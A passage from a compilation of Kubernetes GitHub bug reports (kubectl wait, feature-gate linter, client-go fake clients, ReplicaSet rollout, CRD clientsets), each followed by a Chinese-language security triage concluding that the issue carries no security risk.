Second command should work, as it does with kubectl v1.30.3

#### How can we reproduce it (as minimally and precisely as possible)?

Reproducer against a 1.30.3 server:

```
(
	curl https://dl.k8s.io/v1.31.0-rc.1/kubernetes-client-linux-amd64.tar.gz -L -o v1.31.0-rc.1.tar.gz
	tar xvzf v1.31.0-rc.1.tar.gz -C v1.31.0-rc.1
)


./v1.31.0-rc.1/kubernetes/client/bin/kubectl create deploy nginx --image nginx --replicas 1
./v1.31.0-rc.1/kubernetes/client/bin/kubectl wait deploy nginx --for=condition=available                # works
./v1.31.0-rc.1/kubernetes/client/bin/kubectl wait deploy nginx --for=jsonpath='{.status.readyReplicas}'=1    # does not work
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ ./v1.31.0-rc.1/kubernetes/client/bin/kubectl version
Client Version: v1.31.0-rc.1
Kustomize Version: v5.4.2
Server Version: v1.30.3

```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在使用kubectl v1.31.0-rc.1版本时，执行`kubectl wait --for=jsonpath='{.status.readyReplicas}'=1`命令会挂起，而在v1.30.3版本中可以正常工作。这可能是由于新版本中的功能性回归或Bug导致的命令无法正常执行。从提供的信息来看，并未涉及任何安全风险。根据风险判断标准，此问题不涉及安全风险。

---

## Issue #126741 featuregates_linter fails to update the corresponding files

- Issue 链接：[#126741](https://github.com/kubernetes/kubernetes/issues/126741)

### Issue 内容

#### Repro

```diff
diff --git a/pkg/features/kube_features.go b/pkg/features/kube_features.go
index 80a25132bca..fb598b95ddd 100644
--- a/pkg/features/kube_features.go
+++ b/pkg/features/kube_features.go
@@ -1125,7 +1125,7 @@ var defaultKubernetesFeatureGates = map[featuregate.Feature]featuregate.FeatureS
 
        MinDomainsInPodTopologySpread: {Default: true, PreRelease: featuregate.GA, LockToDefault: true}, // remove in 1.32
 
-       MultiCIDRServiceAllocator: {Default: false, PreRelease: featuregate.Beta},
+       MultiCIDRServiceAllocator: {Default: true, PreRelease: featuregate.Beta},
 
        NewVolumeManagerReconstruction: {Default: true, PreRelease: featuregate.GA, LockToDefault: true}, // remove in 1.32
```

```sh
hack/update-featuregates.sh 
found 158 features in FeatureSpecMap var defaultKubernetesFeatureGates in file: /usr/local/google/home/aojea/src/kubernetes/pkg/features/kube_features.go
found 2 features in FeatureSpecMap var defaultKubernetesFeatureGates in file: /usr/local/google/home/aojea/src/kubernetes/staging/src/k8s.io/apiextensions-apiserver/pkg/features/kube_features.go
found 37 features in FeatureSpecMap var defaultKubernetesFeatureGates in file: /usr/local/google/home/aojea/src/kubernetes/staging/src/k8s.io/apiserver/pkg/features/kube_features.go
found 3 features in FeatureSpecMap of func featureGates in file: /usr/local/google/home/aojea/src/kubernetes/staging/src/k8s.io/component-base/logs/api/v1/kube_features.go
found 1 features in FeatureSpecMap of func featureGates in file: /usr/local/google/home/aojea/src/kubernetes/staging/src/k8s.io/component-base/metrics/features/kube_features.go
found 3 features in FeatureSpecMap var cloudPublicFeatureGates in file: /usr/local/google/home/aojea/src/kubernetes/staging/src/k8s.io/controller-manager/pkg/features/kube_features.go
panic: feature MultiCIDRServiceAllocator changed with diff:   cmd.featureInfo{
                Name:     "MultiCIDRServiceAllocator",
                FullName: "",
                VersionedSpecs: []cmd.featureSpec{
                        {
        -                       Default:       false,
        +                       Default:       true,
                                LockToDefault: false,
                                PreRelease:    "Beta",
                                Version:       "",
                        },
                },
          }


goroutine 1 [running]:
k8s.io/kubernetes/test/featuregates_linter/cmd.updateFeatureListFunc(0xc0001f4d00?, {0x69953d?, 0x4?, 0x6994ed?})
        /usr/local/google/home/aojea/src/kubernetes/test/featuregates_linter/cmd/feature_gates.go:108 +0x91
github.com/spf13/cobra.(*Command).execute(0xc0001fc608, {0x8c8000, 0x0, 0x0})
        /usr/local/google/home/aojea/src/kubernetes/vendor/github.com/spf13/cobra/command.go:989 +0xa91
github.com/spf13/cobra.(*Command).ExecuteC(0x8a3dc0)
        /usr/local/google/home/aojea/src/kubernetes/vendor/github.com/spf13/cobra/command.go:1117 +0x3ff
github.com/spf13/cobra.(*Command).Execute(...)
        /usr/local/google/home/aojea/src/kubernetes/vendor/github.com/spf13/cobra/command.go:1041
k8s.io/kubernetes/test/featuregates_linter/cmd.Execute()
        /usr/local/google/home/aojea/src/kubernetes/test/featuregates_linter/cmd/root.go:32 +0x1a
main.main()
        /usr/local/google/home/aojea/src/kubernetes/test/featuregates_linter/main.go:22 +0xf
```

`verifyFeatureDeletionOnly` does not consider the command is being executed to update the files and fails, so it never updates the corresponding files


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在修改`MultiCIDRServiceAllocator`特性时，`featuregates_linter`脚本无法正确更新相应的文件，导致脚本发生panic。这是由于脚本逻辑上的错误，导致在更新特性门控时验证失败。这属于开发工具自身的问题，不会被攻击者利用，也不会引入安全漏洞。根据风险判断标准，此Issue不涉及安全问题。

---

## Issue #126739 `ValidatingAdmissionPolicyBindingList` is always returned with non-zero length

- Issue 链接：[#126739](https://github.com/kubernetes/kubernetes/issues/126739)

### Issue 内容

#### What happened?

Performing request on `ValidatingAdmissionPolicyList` or `ValidatingAdmissionPolicyBindingList` returns a non-zero length response, event if there are no `ValidatingAdmissionPolicy` in the cluster.

#### What did you expect to happen?

Return empty list, as other resource types.

#### How can we reproduce it (as minimally and precisely as possible)?

Kubernetes v1.30
```
kubectl get ValidatingAdmissionPolicyBinding -A -o yaml
apiVersion: v1
items:
- apiVersion: admissionregistration.k8s.io/v1
  kind: ValidatingAdmissionPolicyBindingList
  metadata:
    resourceVersion: "29454"
kind: List
metadata:
  resourceVersion: ""
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version

warning: This version information is deprecated and will be replaced with the output from kubectl version --short.  Use --output=yaml|json to get the full version.
Client Version: version.Info{Major:"1", Minor:"27", GitVersion:"v1.27.0", GitCommit:"1b4df30b3cdfeaba6024e81e559a6cd09a089d65", GitTreeState:"clean", BuildDate:"2023-04-11T17:10:18Z", GoVersion:"go1.20.3", Compiler:"gc", Platform:"linux/amd64"}
Kustomize Version: v5.0.1
Server Version: version.Info{Major:"1", Minor:"30", GitVersion:"v1.30.0", GitCommit:"7c48c2bd72b9bf5c44d21d7338cc7bea77d0ad2a", GitTreeState:"clean", BuildDate:"2024-05-13T22:00:36Z", GoVersion:"go1.22.2", Compiler:"gc", Platform:"linux/amd64"}
WARNING: version difference between client (1.27) and server (1.30) exceeds the supported minor version skew of +/-1
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的信息，执行 `kubectl get ValidatingAdmissionPolicyBinding -A -o yaml` 命令时，即使集群中没有 `ValidatingAdmissionPolicy`，仍然返回一个非零长度的响应。

经过分析，这种行为可能是由于 API 返回的列表中包含了默认的元数据，即使实际的 items 列表为空。这更像是一个功能性或显示上的问题，并不涉及到潜在的安全风险。

根据风险判断标准：
1. 该问题并不能被攻击者利用来进行攻击。
2. 该问题不会导致漏洞产生，不会被分配 CVE 编号，按照 CVSS 3.1 标准也无法获得 high 以上的评分。
3. 该问题不涉及敏感信息泄露或权限提升等安全风险。

综上所述，此 Issue 不涉及安全风险。

---

## Issue #126732 K8s pod will restart indefinitely

- Issue 链接：[#126732](https://github.com/kubernetes/kubernetes/issues/126732)

### Issue 内容

#### What happened?

Pod sandbox changed, it will be killed and re-created

#### What did you expect to happen?

How to identify the root cause

#### How can we reproduce it (as minimally and precisely as possible)?

How to identify the root cause

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>
1.28

#### Cloud provider

<details>

</details>
null

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的Issue内容，用户报告Kubernetes Pod会无限重启，想要找出根本原因。这是一个关于Kubernetes集群中Pod稳定性的问题，涉及到应用部署和容器管理的常见问题。根据风险判断标准，此Issue未提及任何安全风险、漏洞利用或敏感信息泄露，不涉及攻击者可以利用的安全漏洞。

---

## Issue #126726 client-go 1.31 fake Apply requires `metadata.name` to get set, while live client does not

- Issue 链接：[#126726](https://github.com/kubernetes/kubernetes/issues/126726)

### Issue 内容

Trying out the (excellent!) new Apply with the fake client, I found a different from the fake vs real client


My patch:

```yaml
{
  "kind" : "Service",
  "apiVersion" : "/v1",
  "status" : {
    "conditions" : [ {
      "type" : "t1",
      "status" : "True",
      "lastTransitionTime" : "2024-08-15T23:24:19.307605301Z",
      "reason" : "some reason"
    } ]
  }
}
```

Here
https://github.com/kubernetes/kubernetes/blob/a221d3a40c04b02134a4d1deb436f0787c1f2028/staging/src/k8s.io/client-go/testing/fixture.go#L217 we lose the name. We extract the namespace from the action, but use `applyConfigurationMeta.GetName()` which is empty. This means we have no name, the `Get` fails, and we attempt to `Create` a nameless object.

This doesn't apply to other patch types, which get the live object and apply the patch to them before this point.

This could be fixed, perhaps, by inserting `patchObj.SetName(action.GetName())` before we call `Apply()`?

cc @jpbetz 

/sig api-machinery


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue报告了在使用client-go 1.31的fake客户端时，调用Apply方法需要设置`metadata.name`，而真实的客户端不需要。这导致了fake客户端和真实客户端之间的行为不一致。

从安全角度来看，这个问题主要影响的是测试环境中的行为一致性，可能导致测试结果与实际生产环境不同。但是，这并不涉及攻击者可以利用的漏洞或安全风险。它不会导致命令执行、权限提升、数据泄露等高安全风险的问题。

因此，根据风险判断标准，该Issue不涉及安全风险。

---

## Issue #126722 Andoka Cloud B 

- Issue 链接：[#126722](https://github.com/kubernetes/kubernetes/issues/126722)

### Issue 内容

#### What happened?

#### 
``

1. 

- [x]  [](url)

#### What did you expect to happen?

[](url) 

####  
#126395  [ ]  __

#### How can we reproduce it (as minimally and precisely as possible)?

1. [x]   `` 
2. [x] __****

#### Anything else we need to know?

#### [](url) 
__ 

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的Issue内容，内容主要为空白或占位符，缺乏具体的信息和细节，无法分析出任何潜在的安全风险。根据风险判断标准第6条，如果Issue不涉及安全问题，则风险评级判断为不涉及。

---

## Issue #126704 kube-controller-manager takes 100% cpu on master

- Issue 链接：[#126704](https://github.com/kubernetes/kubernetes/issues/126704)

### Issue 内容

#### What happened?

When starting K8s on master the kube-controller-manager 100% cpu all the time in an idle system. I have 2 cores on my VM's so kube-controller-manager hogs 1 core.

#### What did you expect to happen?

kube-controller-manager should take ~0% cpu in an idle system

#### How can we reproduce it (as minimally and precisely as possible)?

Start K8s on master and run "top"

#### Anything else we need to know?

I made a bisect, and the problem appear in commit eb16aa1d4a5d36482bd58da6737364ef81759002.

I start kube-controller-manager from init scripts, so no POD.

#### Kubernetes version

master (v1.32.0-alpha.0.22+f6a11da279877b)

#### Cloud provider

none

#### OS version

Linux 6.10.0

#### Install tools

none

#### Container runtime (CRI) and version (if applicable)

crio version 1.29.2

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

Probably all CNI-plugins. Tested:

1. flannel:v0.24.2
2. calico/cni:v3.27.0
3. cilium:v1.15.4
4. antrea-ubuntu:v1.14.1


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue报告了`kube-controller-manager`在空闲系统中占用100% CPU的问题。这属于性能问题，没有提及任何安全相关的内容，也没有说明攻击者可以利用该问题对系统进行攻击。根据风险判断标准第6条：如果Issue不涉及安全问题，则风险评级判断为不涉及。

---

## Issue #126881 Volume expand controller doesn't have a support for the flexvolume plugin

- Issue 链接：[#126881](https://github.com/kubernetes/kubernetes/issues/126881)

### Issue 内容

#### What happened?

The flexVolume plugin implements the `ExpandableVolumePlugin` interface, but the expander controller does not add support for it.

- https://github.com/kubernetes/kubernetes/blob/remove-unnecessary-permissions/pkg/controller/volume/expand/expand_controller.go#L118
- https://github.com/kubernetes/kubernetes/blob/remove-unnecessary-permissions/pkg/volume/flexvolume/plugin.go#L59

Is it a bug? the flexVolume plugin has been marked as `deprecated` since v1.23, but it still works.

https://github.com/kubernetes/kubernetes/pull/67851 implemented the Flexvolume resize and said that the flex plugins are not installed on the controller. 

@gnufied said that the flex volume plugin IMO does support allowing expansion from control-plane too. It is just that, most deployments typically don't install the flex volume plugin in the control-plane for various reasons, but if they do and plugin implements expandvolume command, then control-plane expansion will work. 

> if they do and plugin implements expandvolume command, then control-plane expansion will work. 

The prequisite is that the expand controller needs to add support for the flexVolume plugin, but it doesn't now.

What did you expect to happen?



#### What did you expect to happen?

One of the following:

- [ ] The expand controller should add support for the flexVolume plugin. (may not be recommended because the flexVolume plugin is deprecated since v1.23. And no users reported this issue in my knowledge)

- [ ] Once the portworx plugin completes csi migration, can we deprecated the expand controller and then remove it in the future. (recommended) but flex plugin also optionally supports attach which can be executed from control-plane. it means that the flex plugin can be installed on the controller.

#### How can we reproduce it (as minimally and precisely as possible)?

NONE

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
All supported versions
```

</details>


#### Cloud provider

<details>
NONE
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据Issue内容，该问题涉及到Kubernetes的卷扩展控制器不支持flexVolume插件的问题。这是一个功能性缺陷或缺失，并不是一个安全漏洞。没有证据表明攻击者可以利用该问题进行攻击，也没有迹象表明该问题可能导致安全风险。因此，本Issue不涉及安全问题。

---

## Issue #126879 when 'hostPort' is unset from pre-existing deployment using hostNetwork, it spawns new replicaset but fails to delete pre-existing replicaset

- Issue 链接：[#126879](https://github.com/kubernetes/kubernetes/issues/126879)

### Issue 内容

#### What happened?

- i prepared an nginx container to listen on port 9033
- deployed it with a deployment that was configured to use 'hostNetwork: true' and explicitly set 'hostPort: 9033'
- i edited the deployment by simply deleting the 'hostPort' entry
- i then applied the edited deployment manifest
- a second pod was launched, but got stuck in 'Pending' state. The pre-existing pod was not deleted as expected. It kept running
- a second replicaset was launched, but its pod (above) was stuck in pending state. The pre-existing replicaset was not deleted as expected.

```
# diff manifest-original.yaml manifest-tweak.yaml
32d31
<           hostPort: 9033
# KUBECONFIG=kconf kubectl apply -f manifest-original.yaml
deployment.apps/myapp created
$ KUBECONFIG=kconf kubectl get rs -n my-system
NAME                                               DESIRED   CURRENT   READY   AGE
myapp-55758c985                                    1         1         1       8s

$ KUBECONFIG=kconf kubectl get pods -n my-system
NAME                                                     READY   STATUS    RESTARTS   AGE
myapp-55758c985-dft2b                                    1/1     Running   0          20s

$ KUBECONFIG=kconf kubectl apply -f manifest-tweak.yaml 
deployment.apps/myapp configured

$ KUBECONFIG=kconf kubectl get rs -n my-system
NAME                                               DESIRED   CURRENT   READY   AGE
myapp-5564fdd866                                   1         1         0       7s
myapp-55758c985                                    1         1         1       59s

$ KUBECONFIG=kconf kubectl get pods -n my-system
NAME                                                     READY   STATUS    RESTARTS   AGE
myapp-5564fdd866-2wwbg                                   0/1     Pending   0          18s
myapp-55758c985-dft2b                                    1/1     Running   0          70s

$ cat manifest-original.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp
  namespace: my-system
spec:
  progressDeadlineSeconds: 600
  replicas: 1
  selector:
    matchLabels:
      app: myapp
  strategy:
    rollingUpdate:
      maxSurge: 1
      maxUnavailable: 0
    type: RollingUpdate
  template:
    metadata:
      labels:
        app: myapp
    spec:
      containers:
      - name: mgr
        image: docker-local.artifactory.eng.yadayada.com/tilt/nginx:v0 
        imagePullPolicy: IfNotPresent
        ports:
        - containerPort: 9033
          hostPort: 9033
          name: api
          protocol: TCP
        securityContext:
          allowPrivilegeEscalation: false
          capabilities:
            drop:
            - ALL
          readOnlyRootFilesystem: false
          runAsNonRoot: false
      dnsPolicy: ClusterFirst
      hostNetwork: true
      nodeSelector:
        node-role.kubernetes.io/control-plane: ""
      priorityClassName: system-cluster-critical
      restartPolicy: Always
      schedulerName: default-scheduler
      securityContext: {}
      serviceAccount: my-sa
      serviceAccountName: my-sa
      terminationGracePeriodSeconds: 30
      tolerations:
      - key: CriticalAddonsOnly
        operator: Exists
      - effect: NoSchedule
        key: node-role.kubernetes.io/control-plane
      - effect: NoSchedule
        key: node-role.kubernetes.io/master
      - effect: NoSchedule
        key: node.kubernetes.io/not-ready
      - effect: NoSchedule
        key: node.cloudprovider.kubernetes.io/uninitialized
        value: "true"

$ KUBECONFIG=kconf kubectl version
Client Version: v1.29.7
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.28.10

```

#### What did you expect to happen?

- i expected the pre-existing replicaset & its corresponding pod to be completely deleted, and another replicaset created which then successfully runs its pod.

- i did NOT expect the pre-existing replicaset & its corresponding pod to persist, and another replicaset launched whose pod gets stuck in 'Pending' state

#### How can we reproduce it (as minimally and precisely as possible)?

- see linux terminal output in  "What happened?" section above.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ KUBECONFIG=kconf kubectl version
Client Version: v1.29.7
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.28.10
```

</details>


#### Cloud provider

<details>
vsphere
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release 
PRETTY_NAME="Ubuntu 22.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.4 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy

$ uname -a
# paste output here
Linux bug-repro-grpch-jrrd4 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的Issue内容，用户在Kubernetes中部署了一个使用`hostNetwork: true`和显式设置了`hostPort: 9033`的nginx容器。在删除了`hostPort`配置并重新应用后，发现旧的ReplicaSet和Pod未被删除，新的Pod处于`Pending`状态。这个问题与Kubernetes在更新Deployment时的资源管理和调度行为有关，可能是Deployment更新策略或资源调度的问题。

从安全角度来看，这个问题并不涉及潜在的安全风险。没有迹象表明攻击者可以利用此问题进行攻击，导致权限提升、命令执行、容器逃逸等高风险安全问题。因此，根据风险判断标准，此Issue不涉及安全风险。

---

## Issue #126866 ValidatingAdmissionPolicy's Validate func returns decision with Evaluation="" when Action is ActionDeny

- Issue 链接：[#126866](https://github.com/kubernetes/kubernetes/issues/126866)

### Issue 内容

#### What happened?

This issue is about the `Validate` function in `staging/src/k8s.io/apiserver/pkg/admission/plugin/policy/validating/validator.go`.

In this function, `ValidatingAdmissionPolicy`'s `spec.validations.expression` is evaluated in this line:

```
evalResults, remainingBudget, err := v.validationFilter.ForInput(ctx, versionedAttr, admissionRequest, optionalVars, ns, runtimeCELCostBudget)
```

and if `evalResult` is not `true`, `PolicyDecision`'s `Action` is set to `ActionDeny`:

```
} else if evalResult.EvalResult != celtypes.True {
	decision.Action = ActionDeny
...
```

But `decision.Evaluation` remains empty string.


#### What did you expect to happen?

`decision.Evaluation` should be set to `EvalDeny`.

#### How can we reproduce it (as minimally and precisely as possible)?


#### Anything else we need to know?

_No response_

#### Kubernetes version

I imported public library

<details>

<summary>go.mod</summary>

```
module k8s-bug-report

go 1.22.5

require (
	k8s.io/api v0.31.0
	k8s.io/apimachinery v0.31.0
	k8s.io/apiserver v0.31.0
)

require (
	github.com/antlr4-go/antlr/v4 v4.13.0 // indirect
	github.com/asaskevich/govalidator v0.0.0-20190424111038-f61b66f89f4a // indirect
	github.com/beorn7/perks v1.0.1 // indirect
	github.com/blang/semver/v4 v4.0.0 // indirect
	github.com/cenkalti/backoff/v4 v4.3.0 // indirect
	github.com/cespare/xxhash/v2 v2.3.0 // indirect
	github.com/davecgh/go-spew v1.1.2-0.20180830191138-d8f796af33cc // indirect
	github.com/emicklei/go-restful/v3 v3.11.0 // indirect
	github.com/felixge/httpsnoop v1.0.4 // indirect
	github.com/fxamacker/cbor/v2 v2.7.0 // indirect
	github.com/go-logr/logr v1.4.2 // indirect
	github.com/go-logr/stdr v1.2.2 // indirect
	github.com/go-openapi/jsonpointer v0.19.6 // indirect
	github.com/go-openapi/jsonreference v0.20.2 // indirect
	github.com/go-openapi/swag v0.22.4 // indirect
	github.com/gogo/protobuf v1.3.2 // indirect
	github.com/golang/protobuf v1.5.4 // indirect
	github.com/google/cel-go v0.20.1 // indirect
	github.com/google/gnostic-models v0.6.8 // indirect
	github.com/google/go-cmp v0.6.0 // indirect
	github.com/google/gofuzz v1.2.0 // indirect
	github.com/google/uuid v1.6.0 // indirect
	github.com/grpc-ecosystem/grpc-gateway/v2 v2.20.0 // indirect
	github.com/imdario/mergo v0.3.6 // indirect
	github.com/inconshreveable/mousetrap v1.1.0 // indirect
	github.com/josharian/intern v1.0.0 // indirect
	github.com/json-iterator/go v1.1.12 // indirect
	github.com/mailru/easyjson v0.7.7 // indirect
	github.com/modern-go/concurrent v0.0.0-20180306012644-bacd9c7ef1dd // indirect
	github.com/modern-go/reflect2 v1.0.2 // indirect
	github.com/munnerz/goautoneg v0.0.0-20191010083416-a7dc8b61c822 // indirect
	github.com/pkg/errors v0.9.1 // indirect
	github.com/prometheus/client_golang v1.19.1 // indirect
	github.com/prometheus/client_model v0.6.1 // indirect
	github.com/prometheus/common v0.55.0 // indirect
	github.com/prometheus/procfs v0.15.1 // indirect
	github.com/spf13/cobra v1.8.1 // indirect
	github.com/spf13/pflag v1.0.5 // indirect
	github.com/stoewer/go-strcase v1.2.0 // indirect
	github.com/x448/float16 v0.8.4 // indirect
	go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp v0.53.0 // indirect
	go.opentelemetry.io/otel v1.28.0 // indirect
	go.opentelemetry.io/otel/exporters/otlp/otlptrace v1.28.0 // indirect
	go.opentelemetry.io/otel/exporters/otlp/otlptrace/otlptracegrpc v1.27.0 // indirect
	go.opentelemetry.io/otel/metric v1.28.0 // indirect
	go.opentelemetry.io/otel/sdk v1.28.0 // indirect
	go.opentelemetry.io/otel/trace v1.28.0 // indirect
	go.opentelemetry.io/proto/otlp v1.3.1 // indirect
	golang.org/x/exp v0.0.0-20230515195305-f3d0a9c9a5cc // indirect
	golang.org/x/net v0.26.0 // indirect
	golang.org/x/oauth2 v0.21.0 // indirect
	golang.org/x/sync v0.7.0 // indirect
	golang.org/x/sys v0.21.0 // indirect
	golang.org/x/term v0.21.0 // indirect
	golang.org/x/text v0.16.0 // indirect
	golang.org/x/time v0.3.0 // indirect
	google.golang.org/genproto/googleapis/api v0.0.0-20240528184218-531527333157 // indirect
	google.golang.org/genproto/googleapis/rpc v0.0.0-20240701130421-f6361c86f094 // indirect
	google.golang.org/grpc v1.65.0 // indirect
	google.golang.org/protobuf v1.34.2 // indirect
	gopkg.in/evanphx/json-patch.v4 v4.12.0 // indirect
	gopkg.in/inf.v0 v0.9.1 // indirect
	gopkg.in/yaml.v2 v2.4.0 // indirect
	gopkg.in/yaml.v3 v3.0.1 // indirect
	k8s.io/client-go v0.31.0 // indirect
	k8s.io/component-base v0.31.0 // indirect
	k8s.io/klog/v2 v2.130.1 // indirect
	k8s.io/kube-openapi v0.0.0-20240228011516-70dd3763d340 // indirect
	k8s.io/utils v0.0.0-20240711033017-18e509b52bc8 // indirect
	sigs.k8s.io/apiserver-network-proxy/konnectivity-client v0.30.3 // indirect
	sigs.k8s.io/json v0.0.0-20221116044647-bc3834ca7abd // indirect
	sigs.k8s.io/structured-merge-diff/v4 v4.4.1 // indirect
	sigs.k8s.io/yaml v1.4.0 // indirect
)

```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在ValidatingAdmissionPolicy的Validate函数中，当spec.validations.expression的评估结果不为真时，decision.Action被设置为ActionDeny，但decision.Evaluation仍然是空字符串。期望行为是当Action为ActionDeny时，decision.Evaluation应被设置为EvalDeny。

此问题属于功能性错误，可能影响策略评估结果的准确性或完整性，但不会导致攻击者利用它来进行攻击。根据风险判断标准，Issue中提到的问题不涉及安全风险，因为它不满足能够被攻击者利用或导致高风险漏洞的条件。

---

## Issue #126850 The Clientset returned from the new NewClientset function does not work for CRDs

- Issue 链接：[#126850](https://github.com/kubernetes/kubernetes/issues/126850)

### Issue 内容

#### What happened?

Calling the `Create` method fails with, eg

`failed to convert new object (/cluster-egressIP; submariner.io/v1, Kind=ClusterGlobalEgressIP) to smd typed: schema error: no type found matching: com.github.submariner-io.submariner.pkg.apis.submariner.io.v1.ClusterGlobalEgressIP`

Long story short, It ends up trying to validate a resource using the global `schemaYAML` var defined in the generated file _pkg/client/applyconfiguration/internal/internal.go_. However this is not populated with the appropriate types. So `NewClientset` is unusable even though `NewSimpleClientset` is now marked as deprecated.

Note that `NewClientset` works fine with core K8s types because its [schemaYAML](https://github.com/kubernetes/client-go/blob/46965213e4561ad1b9c585d1c3551a0cc8d3fcd6/applyconfigurations/internal/internal.go#L41) is populated appropriately. However [apiextensions](https://github.com/kubernetes/kubernetes/blob/243fdafc6824d6b33faa081efec2ebc4cb164010/staging/src/k8s.io/apiextensions-apiserver/pkg/client/applyconfiguration/internal/internal.go#L41) is not.

#### What did you expect to happen?

I expect the `Clientset` methods to work for CRDs. It seems the code generator needs to be updated.

Also `NewSimpleClientset` should not be deprecated unless/until `NewClientset` works.

#### How can we reproduce it (as minimally and precisely as possible)?

```
import fakeclientset "k8s.io/apiextensions-apiserver/pkg/client/clientset/clientset/fake"
...
client := fakeclientset.NewClientset()
client.ApiextensionsV1().CustomResourceDefinitions().Create(ctx, crd, metav1.CreateOptions{})
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在使用`NewClientset`函数创建Clientset时，对于CRD（自定义资源定义）的操作会失败，原因是schema未正确填充，导致无法找到匹配的类型。这是由于代码生成器的问题，需要更新以支持CRD。然而，整个问题仅涉及到功能性错误，并不存在安全风险。

按照风险判断标准，此Issue未涉及任何安全风险：
1. 没有提及攻击者可以利用该问题。
2. 不可能成为一个漏洞，不会被分配CVE编号。
3. 未暴露敏感信息或配置问题。
4. 不涉及拒绝服务攻击。
5. 未涉及凭据泄露。
6. 故风险评级判断为不涉及。

---

## Issue #126795 [Windows] Unable to connect to host process container pod on windows node

- Issue 链接：[#126795](https://github.com/kubernetes/kubernetes/issues/126795)

### Issue 内容

#### What happened?

I have a windows node with a pod running as a host process container, and therefore with hostNetwork:true. I have the pod exposed as a ClusterIP service. I have a separate pod on the same node (not running as a host process container or with hostNetwork: true) trying to communicate to the ClusterIP, but instead get a connection error.

```
PS C:\> telnet 10.100.24.184 4316
